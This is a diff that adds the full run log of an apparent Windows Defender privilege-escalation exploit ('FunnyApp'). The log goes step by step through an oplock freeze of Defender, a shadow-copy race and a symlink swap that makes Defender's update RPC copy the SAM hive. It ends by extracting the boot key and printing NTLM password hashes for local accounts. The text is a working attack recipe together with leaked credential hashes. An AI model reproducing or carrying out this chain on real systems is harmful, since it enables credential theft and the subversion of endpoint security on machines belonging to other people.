@@ -1,0 +1,216 @@
+.\FunnyApp.exe
+[2026-04-27 22:46:05.075] [INFO][MAIN] Checking for Windows Defender signature updates...
+[2026-04-27 22:46:05.086] [INFO][COM] Initializing COM for WU API...
+[2026-04-27 22:46:05.093] [OK][COM] CoInitialize succeeded
+[2026-04-27 22:46:05.093] [INFO][COM] CLSIDFromProgID(Microsoft.Update.Session)...
+[2026-04-27 22:46:05.095] [OK][COM] CLSID resolved
+[2026-04-27 22:46:05.098] [INFO][COM] CoCreateInstance(IUpdateSession)...
+[2026-04-27 22:46:05.160] [OK][COM] IUpdateSession created at 0x000001DE3EFD6190
+[2026-04-27 22:46:05.165] [INFO][COM] Creating update searcher...
+[2026-04-27 22:46:05.165] [OK][COM] IUpdateSearcher created at 0x000001DE3F058D38
+[2026-04-27 22:46:05.165] [INFO][COM] Searching for updates (this may take a while)...
+[2026-04-27 22:47:35.168] [OK][COM] Search completed, ISearchResult=0x000001DE3F050BB8
+[2026-04-27 22:47:35.168] [INFO][COM] Found 7 pending updates, scanning for WD signature update...
+[2026-04-27 22:47:35.168] [INFO][COM] ????????????????????????????????????????
+[2026-04-27 22:47:35.168] [INFO][COM] Processing update [1/7]...
+[2026-04-27 22:47:35.170] [OK][COM]   IUpdate[0] acquired at 0x000001DE3EFDCC38
+[2026-04-27 22:47:35.170] [INFO][COM]   Title : Update for Windows Security platform - KB5007651 (Version 10.0.29554.1001)
+[2026-04-27 22:47:35.170] [INFO][COM]   IsInstalled    : FALSE
+[2026-04-27 22:47:35.172] [INFO][COM]   IsDownloaded   : FALSE
+[2026-04-27 22:47:35.172] [INFO][COM]   IsMandatory    : FALSE
+[2026-04-27 22:47:35.179] [INFO][COM]   IsHidden       : FALSE
+[2026-04-27 22:47:35.179] [INFO][COM]   Description : This package will update Windows Security platform components on the user machine.
+[2026-04-27 22:47:35.179] [INFO][COM]   UpdateID : a32ca1d0-ddd4-486b-b708-d941db4f1101
+[2026-04-27 22:47:35.179] [INFO][COM]   RevisionNumber : 204
+[2026-04-27 22:47:35.179] [INFO][COM]   Categories count: 2
+[2026-04-27 22:47:35.179] [INFO][COM]     Category[0]: Name="Definition Updates" | ID=e0789628-ce08-4437-be74-2495b842f43b
+[2026-04-27 22:47:35.179] [OK][COM]     >>> MATCH: category is 'Definition Updates'
+[2026-04-27 22:47:35.179] [INFO][COM]     Category[1]: Name="Windows Security platform" | ID=2d2a68ab-50ca-4d80-b96c-757bc32024c7
+[2026-04-27 22:47:35.179] [INFO][COM]     (no match for WD criteria)
+[2026-04-27 22:47:35.179] [INFO][COM]   Verdict: IsWdUpdate=FALSE, IsSigUpdate=TRUE
+[2026-04-27 22:47:35.179] [INFO][COM]   Not a WD signature update, continuing...
+[2026-04-27 22:47:35.181] [INFO][COM] ????????????????????????????????????????
+[2026-04-27 22:47:35.181] [INFO][COM] Processing update [2/7]...
+[2026-04-27 22:47:35.181] [OK][COM]   IUpdate[1] acquired at 0x000001DE3F055F18
+[2026-04-27 22:47:35.181] [INFO][COM]   Title : Windows Malicious Software Removal Tool x64 - v5.140 (KB890830)
+[2026-04-27 22:47:35.181] [INFO][COM]   IsInstalled    : FALSE
+[2026-04-27 22:47:35.184] [INFO][COM]   IsDownloaded   : FALSE
+[2026-04-27 22:47:35.189] [INFO][COM]   IsMandatory    : FALSE
+[2026-04-27 22:47:35.189] [INFO][COM]   IsHidden       : FALSE
+[2026-04-27 22:47:35.192] [INFO][COM]   Description : After the download, this tool runs one time to check your computer for infection by specific, prevalent malicious software (including Blaster, Sasser, and Mydoom) and helps remove any infection that i...
+[2026-04-27 22:47:35.192] [INFO][COM]   UpdateID : e20ecd7e-9517-4f2d-9530-5cd83d0c1e9f
+[2026-04-27 22:47:35.192] [INFO][COM]   RevisionNumber : 200
+[2026-04-27 22:47:35.192] [INFO][COM]   Categories count: 6
+[2026-04-27 22:47:35.192] [INFO][COM]     Category[0]: Name="EU Browser Choice Update-For Europe Only" | ID=4ea8aeaf-1d28-463e-8179-af9829f81212
+[2026-04-27 22:47:35.192] [INFO][COM]     (no match for WD criteria)
+[2026-04-27 22:47:35.192] [INFO][COM]     Category[1]: Name="Update Rollups" | ID=28bc880e-0592-4cbf-8f95-c79b17911d5f
+[2026-04-27 22:47:35.192] [INFO][COM]     (no match for WD criteria)
+[2026-04-27 22:47:35.192] [INFO][COM]     Category[2]: Name="Windows 10" | ID=a3c2375d-0c8a-42f9-bce0-28333e198407
+[2026-04-27 22:47:35.192] [INFO][COM]     (no match for WD criteria)
+[2026-04-27 22:47:35.192] [INFO][COM]     Category[3]: Name="Windows 10 LTSB" | ID=d2085b71-5f1f-43a9-880d-ed159016d5c6
+[2026-04-27 22:47:35.192] [INFO][COM]     (no match for WD criteria)
+[2026-04-27 22:47:35.192] [INFO][COM]     Category[4]: Name="Windows 10, version 1903 and later" | ID=b3c75dc1-155f-4be4-b015-3f1a91758e52
+[2026-04-27 22:47:35.192] [INFO][COM]     (no match for WD criteria)
+[2026-04-27 22:47:35.192] [INFO][COM]     Category[5]: Name="Windows 11" | ID=72e7624a-5b00-45d2-b92f-e561c0a6a160
+[2026-04-27 22:47:35.192] [INFO][COM]     (no match for WD criteria)
+[2026-04-27 22:47:35.192] [INFO][COM]   Verdict: IsWdUpdate=FALSE, IsSigUpdate=FALSE
+[2026-04-27 22:47:35.192] [INFO][COM]   Not a WD signature update, continuing...
+[2026-04-27 22:47:35.192] [INFO][COM] ????????????????????????????????????????
+[2026-04-27 22:47:35.192] [INFO][COM] Processing update [3/7]...
+[2026-04-27 22:47:35.192] [OK][COM]   IUpdate[2] acquired at 0x000001DE40B3E628
+[2026-04-27 22:47:35.192] [INFO][COM]   Title : Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.449.320.0) - Current Channel (Broad)
+[2026-04-27 22:47:35.192] [INFO][COM]   IsInstalled    : FALSE
+[2026-04-27 22:47:35.196] [INFO][COM]   IsDownloaded   : FALSE
+[2026-04-27 22:47:35.196] [INFO][COM]   IsMandatory    : FALSE
+[2026-04-27 22:47:35.196] [INFO][COM]   IsHidden       : FALSE
+[2026-04-27 22:47:35.196] [INFO][COM]   Description : Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.
+[2026-04-27 22:47:35.196] [INFO][COM]   UpdateID : 4b663cc1-9764-4a7e-a83b-35dc2c8d71c6
+[2026-04-27 22:47:35.196] [INFO][COM]   RevisionNumber : 200
+[2026-04-27 22:47:35.196] [INFO][COM]   Categories count: 2
+[2026-04-27 22:47:35.196] [INFO][COM]     Category[0]: Name="Definition Updates" | ID=e0789628-ce08-4437-be74-2495b842f43b
+[2026-04-27 22:47:35.198] [OK][COM]     >>> MATCH: category is 'Definition Updates'
+[2026-04-27 22:47:35.198] [INFO][COM]     Category[1]: Name="Microsoft Defender Antivirus" | ID=8c3fcc84-7410-4a95-8b89-a166a0190486
+[2026-04-27 22:47:35.198] [OK][COM]     >>> MATCH: category is 'Microsoft Defender Antivirus'
+[2026-04-27 22:47:35.198] [INFO][COM]   Verdict: IsWdUpdate=TRUE, IsSigUpdate=TRUE
+[2026-04-27 22:47:35.198] [OK][COM]   *** WD signature update FOUND: Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.449.320.0) - Current Channel (Broad) ***
+[2026-04-27 22:47:35.198] [INFO][COM] Releasing COM objects...
+[2026-04-27 22:47:35.203] [OK][COM] COM shutdown complete
+[2026-04-27 22:47:35.203] [OK][MAIN] Found update: Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.449.320.0) - Current Channel (Broad)
+[2026-04-27 22:47:35.203] [INFO][DL] Starting update download...
+[2026-04-27 22:47:35.221] [INFO][PROXY] InternetQueryOption flags=0x00000003
+[2026-04-27 22:47:35.221] [INFO][PROXY] System proxy detected: 192.168.199.1:3128
+[2026-04-27 22:47:35.221] [INFO][PROXY] Proxy bypass list: <local>
+[2026-04-27 22:47:35.221] [INFO][NET] InternetOpen: using explicit proxy 192.168.199.1:3128
+[2026-04-27 22:47:35.221] [INFO][NET] Timeouts set to 30000 ms
+[2026-04-27 22:47:35.221] [OK][DL] InternetOpen succeeded, handle=0x0000000000CC0004
+[2026-04-27 22:47:35.221] [INFO][DL] Opening URL: https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64
+[2026-04-27 22:47:36.129] [OK][DL] URL opened, handle=0x0000000000CC000C
+[2026-04-27 22:47:36.129] [INFO][DL] HTTP status code: 200
+[2026-04-27 22:47:36.129] [INFO][DL] Content-Type: application/octet-stream
+[2026-04-27 22:47:36.129] [INFO][DL] Final URL (after redirects): https://definitionupdates.microsoft.com/packages/content/mpam-fe.exe?packageType=Signatures&packageVersion=1.449.320.0&arch=amd64&engineVersion=1.1.26030.3008
+[2026-04-27 22:47:36.132] [INFO][DL] Content-Length: 209414560 bytes (199.71 MB)
+[2026-04-27 22:47:36.206] [INFO][DL] Downloading 209414560 bytes...
+[2026-04-27 22:47:37.200] [INFO][DL] Progress: 20971520/209414560 bytes (10%)
+[2026-04-27 22:47:38.148] [INFO][DL] Progress: 41943040/209414560 bytes (20%)
+[2026-04-27 22:47:45.327] [OK][DL] Download complete: 209414560 bytes
+[2026-04-27 22:47:45.348] [OK][DL] Cabinet extracted from PE .rsrc: addr=0x000001DE42BC0184, size=209109809 bytes
+[2026-04-27 22:47:45.348] [INFO][CAB] Creating FDI context for in-memory cab extraction...
+[2026-04-27 22:47:45.348] [OK][CAB] FDI context created
+[2026-04-27 22:47:45.348] [INFO][CAB] FDICopy: extracting cabinet...
+[2026-04-27 22:47:45.968] [OK][CAB] FDICopy succeeded
+[2026-04-27 22:47:46.123] [INFO][CAB]   Extracted file: mpengine.dll (18215368 bytes)
+[2026-04-27 22:47:46.723] [INFO][CAB]   Extracted file: mpasbase.vdm (136663976 bytes)
+[2026-04-27 22:47:46.736] [INFO][CAB]   Extracted file: mpasdlta.vdm (1703840 bytes)
+[2026-04-27 22:47:47.061] [INFO][CAB]   Extracted file: mpavbase.vdm (61969864 bytes)
+[2026-04-27 22:47:47.066] [INFO][CAB]   Extracted file: mpavdlta.vdm (1877408 bytes)
+[2026-04-27 22:47:47.066] [OK][CAB] Cab file content extracted: 0 files total
+[2026-04-27 22:47:47.093] [OK][MAIN] Update files ready
+[2026-04-27 22:47:47.093] [INFO][MAIN] Creating VSS copy via WD oplock trick...
+[2026-04-27 22:47:47.093] [INFO][VSS] Creating ShadowCopyFinder thread...
+[2026-04-27 22:47:47.093] [OK][VSS] ShadowCopyFinder thread created, TID=10016
+[2026-04-27 22:47:47.093] [INFO][VSS] Creating work directory: C:\Users\gam4er\AppData\Local\Temp\56d53ee0-cb3e-46ef-9585-7d7288c97e57
+[2026-04-27 22:47:47.093] [INFO][VSSFIND] Thread started. Opening \Device object directory...
+[2026-04-27 22:47:47.093] [OK][VSSFIND] \Device directory opened, handle=0x000000000000074C
+[2026-04-27 22:47:47.093] [INFO][VSSFIND] Retrieving initial VSS snapshot list...
+[2026-04-27 22:47:47.093] [INFO][VSS] Querying \Device directory for existing VSS volumes (initial buffer=131100 bytes)...
+[2026-04-27 22:47:47.093] [INFO][VSS] Creating EICAR trigger file: C:\Users\gam4er\AppData\Local\Temp\56d53ee0-cb3e-46ef-9585-7d7288c97e57\foo.exe
+[2026-04-27 22:47:47.093] [INFO][VSS]   Found existing VSS: HarddiskVolumeShadowCopy2
+[2026-04-27 22:47:47.093] [INFO][VSS] Initial VSS enumeration complete: 1 shadow copies found
+[2026-04-27 22:47:47.093] [OK][VSSFIND] Baseline established: 1 existing volume shadow copies
+[2026-04-27 22:47:47.093] [INFO][VSSFIND]   Baseline[0]: HarddiskVolumeShadowCopy2
+[2026-04-27 22:47:47.093] [INFO][VSSFIND] Starting scan loop for NEW shadow copy (not in baseline)...
+[2026-04-27 22:47:47.093] [OK][VSS] EICAR file created
+[2026-04-27 22:47:47.093] [OK][VSS] EICAR content written (68 bytes)
+[2026-04-27 22:47:47.093] [INFO][VSS] Opening RstrtMgr.dll for exclusive oplock: C:\WINDOWS\System32\RstrtMgr.dll
+[2026-04-27 22:47:47.095] [OK][VSS] RstrtMgr.dll opened exclusively, handle=0x0000000000000790
+[2026-04-27 22:47:47.095] [INFO][VSS] Requesting FSCTL_REQUEST_BATCH_OPLOCK on RstrtMgr.dll...
+[2026-04-27 22:47:47.095] [OK][VSS] Oplock request pending on RstrtMgr.dll
+[2026-04-27 22:47:47.095] [INFO][VSS] Triggering WD by opening EICAR file...
+[2026-04-27 22:47:47.107] [INFO][VSS] Waiting for RstrtMgr oplock to trigger...
+[2026-04-27 22:47:52.603] [INFO][VSSFIND]   Scan iteration #50, still searching...
+[2026-04-27 22:47:58.219] [INFO][VSSFIND]   Scan iteration #100, still searching...
+[2026-04-27 22:48:03.810] [INFO][VSSFIND]   Scan iteration #150, still searching...
+[2026-04-27 22:48:04.811] [OK][VSSFIND] NEW shadow copy found: HarddiskVolumeShadowCopy3 (iteration #159)
+[2026-04-27 22:48:04.814] [OK][VSSFIND] New volume shadow copy path: \Device\HarddiskVolumeShadowCopy3
+[2026-04-27 22:48:04.816] [INFO][VSSFIND] Verifying VSS accessibility: \Device\HarddiskVolumeShadowCopy3\Windows
+[2026-04-27 22:48:05.792] [OK][VSSFIND] VSS verified accessible after 16 retries
+[2026-04-27 22:48:05.796] [OK][VSSFIND] Thread exiting successfully
+[2026-04-27 22:48:05.923] [OK][VSS] Oplock triggered - WD is processing the EICAR file
+[2026-04-27 22:48:05.923] [INFO][VSS] Waiting for ShadowCopyFinder thread to complete (timeout=120s)...
+[2026-04-27 22:48:05.923] [INFO][VSS] ShadowCopyFinder thread exited with code=0 (0x00000000)
+[2026-04-27 22:48:05.923] [OK][VSS] ShadowCopyFinder thread completed successfully
+[2026-04-27 22:48:05.923] [INFO][VSS] Creating FreezeVSS thread...
+[2026-04-27 22:48:05.923] [OK][VSS] FreezeVSS thread created, TID=11980
+[2026-04-27 22:48:05.923] [INFO][VSS] Waiting for FreezeVSS thread (hvssready event or thread exit)...
+[2026-04-27 22:48:05.923] [OK][FREEZEVSS] Lock file created: C:\Users\gam4er\Desktop\FunnyApp\ee375cf9-3cb0-41a3-bf0a-4e2c7d5961ff.lock, handle=0x0000000000000838
+[2026-04-27 22:48:05.923] [INFO][FREEZEVSS] Registering sync root: C:\Users\gam4er\Desktop\FunnyApp (provider=IHATEMICROSOFT)
+[2026-04-27 22:48:05.930] [OK][FREEZEVSS] Sync root registered: C:\Users\gam4er\Desktop\FunnyApp
+[2026-04-27 22:48:05.932] [OK][FREEZEVSS] Sync root connected, cfkey=0x1DE3EFE8D80
+[2026-04-27 22:48:05.932] [INFO][FREEZEVSS] Waiting for WD to access placeholder directory (hnotifywdaccess)...
+[2026-04-27 22:48:05.994] [INFO][CLOUDF] CfCallbackFetchPlaceholders triggered: caller=MsMpEng.exe (PID=3200), WD_PID=3200
+[2026-04-27 22:48:05.997] [OK][CLOUDF] Windows Defender process matched! PID=3200, image=\Device\HarddiskVolume3\Program Files\Windows Defender\MsMpEng.exe
+[2026-04-27 22:48:05.997] [OK][FREEZEVSS] WD accessed the placeholder - proceeding to oplock lock file
+[2026-04-27 22:48:05.997] [INFO][FREEZEVSS] Requesting FSCTL_REQUEST_BATCH_OPLOCK on lock file...
+[2026-04-27 22:48:05.997] [OK][FREEZEVSS] Oplock request pending on lock file
+[2026-04-27 22:48:05.997] [INFO][FREEZEVSS] hnotifylockcreated signaled - CfExecute will now proceed in callback
+[2026-04-27 22:48:05.997] [INFO][FREEZEVSS] Waiting for oplock to be broken (WD opening lock file => WD frozen)...
+[2026-04-27 22:48:05.997] [OK][FREEZEVSS] Oplock broken - WD thread is now frozen, VSS is accessible
+[2026-04-27 22:48:05.997] [OK][VSS] FreezeVSS ready event signaled - WD is frozen
+[2026-04-27 22:48:05.997] [INFO][OBJMGR] Creating object directory: \Sessions\1\BaseNamedObjects\23ff4764-5204-450a-b395-40d2eedc094a
+[2026-04-27 22:48:05.997] [OK][OBJMGR] Object directory created, handle=0x0000000000000798
+[2026-04-27 22:48:05.999] [OK][MAIN] Created update directory: C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a
+[2026-04-27 22:48:05.999] [INFO][OBJMGR] Creating symlink WDUpdateDirectory -> \??\C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a
+[2026-04-27 22:48:05.999] [OK][OBJMGR] WDUpdateDirectory symlink created
+[2026-04-27 22:48:06.010] [OK][MAIN] Written update file: C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a\mpengine.dll (18215368 bytes)
+[2026-04-27 22:48:06.249] [OK][MAIN] Written update file: C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a\mpasbase.vdm (136663976 bytes)
+[2026-04-27 22:48:06.251] [OK][MAIN] Written update file: C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a\mpasdlta.vdm (1703840 bytes)
+[2026-04-27 22:48:06.381] [OK][MAIN] Written update file: C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a\mpavbase.vdm (61969864 bytes)
+[2026-04-27 22:48:06.383] [OK][MAIN] Written update file: C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a\mpavdlta.vdm (1877408 bytes)
+[2026-04-27 22:48:06.383] [INFO][MAIN] Opening WD Definition Updates directory for monitoring...
+[2026-04-27 22:48:06.383] [OK][MAIN] Definition Updates directory opened for monitoring
+[2026-04-27 22:48:06.383] [INFO][MAIN] Invoking WD RPC and monitoring for new definition update directory...
+[2026-04-27 22:48:06.405] [INFO][RPC] Composing RPC binding string for WD UUID c503f532-443a-4c69-8300-ccd1fbdb3839
+[2026-04-27 22:48:06.451] [OK][RPC] Binding string composed: c503f532-443a-4c69-8300-ccd1fbdb3839@ncalrpc:[IMpService77BDAF73-B396-481F-9042-AD358843EC24]
+[2026-04-27 22:48:06.455] [OK][RPC] Bound to WD ALPC port, handle=0x000001DE3F03BEF0
+[2026-04-27 22:48:06.491] [INFO][RPC] Calling Proc42_ServerMpUpdateEngineSignature, dirpath=\\?\GLOBALROOT\Sessions\1\BaseNamedObjects\23ff4764-5204-450a-b395-40d2eedc094a\WDUpdateDirectory
+[2026-04-27 22:48:06.631] [OK][MAIN] New definition update directory detected: C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{134127A4-19CA-4269-8C70-20F9C35897D0}
+[2026-04-27 22:48:06.639] [INFO][OPLOCK] Opening \??\C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a\mpasbase.vdm with DELETE_ON_CLOSE for oplock...
+[2026-04-27 22:48:06.639] [OK][OPLOCK] File opened, handle=0x0000000000000708
+[2026-04-27 22:48:06.639] [INFO][OPLOCK] Setting batch oplock on \??\C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a\mpasbase.vdm
+[2026-04-27 22:48:06.639] [OK][OPLOCK] Batch oplock pending on \??\C:\Users\gam4er\AppData\Local\Temp\23ff4764-5204-450a-b395-40d2eedc094a\mpasbase.vdm
+[2026-04-27 22:48:06.639] [INFO][OPLOCK] Waiting for oplock to trigger (WD reading mpasbase.vdm)...
+[2026-04-27 22:48:07.147] [OK][OPLOCK] Oplock triggered! Performing symlink swap...
+[2026-04-27 22:48:07.147] [INFO][OBJMGR] Re-creating WDUpdateDirectory symlink -> \Sessions\1\BaseNamedObjects\23ff4764-5204-450a-b395-40d2eedc094a
+[2026-04-27 22:48:07.147] [OK][OBJMGR] WDUpdateDirectory symlink swapped
+[2026-04-27 22:48:07.147] [INFO][OBJMGR] Creating symlink mpasbase.vdm -> \Device\HarddiskVolumeShadowCopy3\Windows\System32\Config\SAM
+[2026-04-27 22:48:07.147] [OK][OBJMGR] mpasbase.vdm -> SAM symlink created. WD will now copy SAM for us.
+[2026-04-27 22:48:07.163] [INFO][MAIN] Creating KTM transaction for safe file access...
+[2026-04-27 22:48:07.163] [INFO][MAIN] Waiting for leaked SAM file at C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{134127A4-19CA-4269-8C70-20F9C35897D0}\mpasbase.vdm...
+[2026-04-27 22:48:07.193] [OK][MAIN] Leaked SAM file opened: C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{134127A4-19CA-4269-8C70-20F9C35897D0}\mpasbase.vdm
+[2026-04-27 22:48:07.193] [OK][EXPLOIT] === EXPLOIT SUCCEEDED === SAM file leaked via WD symlink race
+[2026-04-27 22:48:07.193] [INFO][OFFREG] Opening SAM hive via OROpenHiveByHandle...
+[2026-04-27 22:48:07.193] [OK][OFFREG] SAM hive opened, handle=0x000001DE4202C7A0
+[2026-04-27 22:48:07.193] [INFO][OFFREG] Extracting LSA boot key from registry...
+[2026-04-27 22:48:07.193] [OK][CLOUDF] CfExecute (WD branch) succeeded: hr=0x00000000
+[2026-04-27 22:48:07.195] [OK][OFFREG] Boot key extracted successfully
+[2026-04-27 22:48:07.195] [OK][OFFREG] SAM Account F value read (368 bytes)
+[2026-04-27 22:48:07.195] [OK][OFFREG] Opened SAM\Domains\Account\Users
+[2026-04-27 22:48:07.195] [INFO][OFFREG] Users subkey count: 6
+[2026-04-27 22:48:07.195] [INFO][SAM] Current user: gam4er
+[2026-04-27 22:48:07.197] [INFO][SAM] ??????????????????????????????????????????
+[2026-04-27 22:48:07.197] [INFO][SAM]   User : Administrator | RID : 500 | NTLM : {NULL}
+[2026-04-27 22:48:07.197] [WARN][SAM]   Skip: NULL NTLM hash
+[2026-04-27 22:48:07.197] [INFO][SAM] ??????????????????????????????????????????
+[2026-04-27 22:48:07.197] [INFO][SAM]   User : Guest | RID : 501 | NTLM : {NULL}
+[2026-04-27 22:48:07.197] [WARN][SAM]   Skip: NULL NTLM hash
+[2026-04-27 22:48:07.197] [INFO][SAM] ??????????????????????????????????????????
+[2026-04-27 22:48:07.197] [INFO][SAM]   User : DefaultAccount | RID : 503 | NTLM : {NULL}
+[2026-04-27 22:48:07.197] [WARN][SAM]   Skip: NULL NTLM hash
+[2026-04-27 22:48:07.197] [INFO][SAM] ??????????????????????????????????????????
+[2026-04-27 22:48:07.197] [INFO][SAM]   User : WDAGUtilityAccount | RID : 504 | NTLM : 91a35b3d5f203ed5c641fe0f0a019368
+[2026-04-27 22:48:07.197] [INFO][SAM]   Skip: WDAGUtilityAccount
+[2026-04-27 22:48:07.201] [INFO][SAM] ??????????????????????????????????????????
+[2026-04-27 22:48:07.201] [INFO][SAM]   User : gam4er | RID : 1001 | NTLM : 7cdf87497d63c64822eec5bcd6aa4753
+[2026-04-27 22:48:07.201] [INFO][SAM]   Skip: current user
+[2026-04-27 22:48:07.203] [INFO][SAM] ??????????????????????????????????????????
+[2026-04-27 22:48:12.262] [INFO][RPC] Proc42 returned: RPC_STATUS=0x80070714, error_status_t=0x00000000
